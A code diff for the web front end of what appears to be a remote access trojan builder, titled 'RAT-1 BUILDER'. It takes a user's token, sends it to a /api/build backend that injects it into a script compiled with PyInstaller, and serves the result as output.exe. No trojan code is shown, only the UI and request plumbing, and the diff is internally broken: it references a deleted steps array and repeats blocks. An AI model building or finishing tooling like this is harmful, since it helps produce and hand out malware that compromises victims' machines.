@@ -141,6 +141,8 @@ function renderTool1() {
   `;
 }
 
+
+
 // Build logic for Tool 1
 async function runBuild() {
   const input   = document.getElementById('build-token-input');
@@ -169,16 +171,15 @@ async function runBuild() {
 
   // Simulate build steps — replace this block with your actual backend call
   // PLACEHOLDER: Replace the simulated steps below with a real fetch() to your build backend/API
-  const steps = [
-    { msg: `> Injecting token into script ...`,          delay: 600  },
-    { msg: `> Token accepted: <span style="color:var(--accent)">${escHtml(build_1field.slice(0,6))}••••</span>`, delay: 900  },
-    { msg: `> Running PyInstaller — please wait...`,             delay: 1500 },
-    { msg: `> Bundling dependencies...`,                         delay: 2400 },
-    { msg: `> Compiling binary...`,                              delay: 3200 },
-    { msg: `✔ Build complete. Executable ready.`,                delay: 3800, type: 'ok' },
-  ];
+const res = await fetch('/api/build', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ build_1field })
+});
+const blob = await res.blob();
+window._exeBlob = blob; // stored for download button
 
-  for (const step of steps) {
+   for (const step of steps) {
     await wait(step.delay);
     log(step.msg, step.type || '');
   }
@@ -198,6 +199,110 @@ function downloadExe() {
     ['# PLACEHOLDER — this is where your compiled executable binary would be delivered.\n# Replace this logic with a real download from your build server.'],
     { type: 'application/octet-stream' }
   );
+   const url = URL.createObjectURL(window._exeBlob);
+   const a = document.createElement('a');
+   a.href = url;
+   a.download = 'output.exe'; // change filename here
+   a.click();
+   URL.revokeObjectURL(url);
+}
+
+// ----------------------------------------------------------------------
+// Second tool
+// ----------------------------------------------------------------------
+function renderTool2() {
+  return `
+    <div class="page-header">
+      <span class="page-tag">// TOOL 01</span>
+      <!-- PLACEHOLDER: Tool 1 page title -->
+      <div class="page-title">RAT-1 BUILDER</div>
+      <!-- PLACEHOLDER: Tool 1 page description -->
+      <div class="page-desc">PLACEHOLDER — Enter your token below. The script will inject it and compile a standalone executable.</div>
+    </div>
+
+    <div class="tool-card">
+      <!-- PLACEHOLDER: Tool 1 input field label -->
+      <span class="tool-label">// PUT YOUR TOKEN HERE</span>
+      <div class="tool-input-row">
+        <input
+          class="tool-input"
+          id="build-token-input-2"
+          type="text"
+          placeholder="PLACEHOLDER — paste token here..."
+          onkeydown="if(event.key==='Enter') runBuild()"
+        />
+        <button class="btn-build" id="build-btn-2" onclick="runBuild2()">Build</button>
+      </div>
+
+      <div class="build-status-2" id="build-status-2"></div>
+      <button class="btn-download" id="download-btn-2" onclick="downloadExe2()">
+        ⬇ Download Executable
+      </button>
+    </div>
+
+    <div class="tag-row" style="margin-top:28px">
+      <!-- PLACEHOLDER: Tool 1 tags / badges -->
+      <span class="tag">PyInstaller</span>
+      <span class="tag">Python</span>
+      <span class="tag">PLACEHOLDER TAG</span>
+    </div>
+  `;
+}
+// Build logic for Tool 2
+async function runBuild2() {
+  const input   = document.getElementById('build-token-input-2');
+  const status  = document.getElementById('build-status-2');
+  const btn     = document.getElementById('build-btn-2');
+  const dlBtn   = document.getElementById('download-btn-2');
+
+  const build_1field = input.value.trim(); // PLACEHOLDER: This value is injected into your script as {build_1field}
+  if (!build_1field) {
+    input.focus();
+    input.style.borderColor = 'var(--accent3)';
+    setTimeout(() => { input.style.borderColor = ''; }, 1200);
+    return;
+  }
+
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spinner"></span>Building...';
+  dlBtn.classList.remove('visible');
+
+  status.classList.add('visible');
+  status.innerHTML = '';
+
+  const log = (msg, type = '') => {
+    status.innerHTML += `<span class="log-line ${type}">${msg}</span>`;
+  };
+
+  // Simulate build steps — replace this block with your actual backend call
+  // PLACEHOLDER: Replace the simulated steps below with a real fetch() to your build backend/API
+const res = await fetch('/api/build', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ build_1field })
+});
+const blob = await res.blob();
+window._exeBlob = blob; // stored for download button
+
+   for (const step of steps) {
+    await wait(step.delay);
+    log(step.msg, step.type || '');
+  }
+
+  btn.disabled = false;
+  btn.innerHTML = 'Build';
+  dlBtn.classList.add('visible');
+
+  // Store the token so downloadExe can use it if needed
+  window._lastBuildToken = build_1field;
+}
+function downloadExe2() {
+  // PLACEHOLDER: Replace this with the actual download URL/blob returned by your build backend
+  // e.g. window.location.href = '/api/download?token=' + encodeURIComponent(window._lastBuildToken);
+  const placeholder = new Blob(
+    ['# PLACEHOLDER — this is where your compiled executable binary would be delivered.\n# Replace this logic with a real download from your build server.'],
+    { type: 'application/octet-stream' }
+  );
   const url = URL.createObjectURL(placeholder);
   const a = document.createElement('a');
   a.href = url;
@@ -209,7 +314,7 @@ function downloadExe() {
 // -----------------------------------------------------------------------
 // TOOL PAGE 2 — PLACEHOLDER-CYPH ZIP download
 // -----------------------------------------------------------------------
-function renderTool2() {
+function renderTool3() {
   return `
     <div class="page-header">
       <span class="page-tag">// TOOL 02</span>
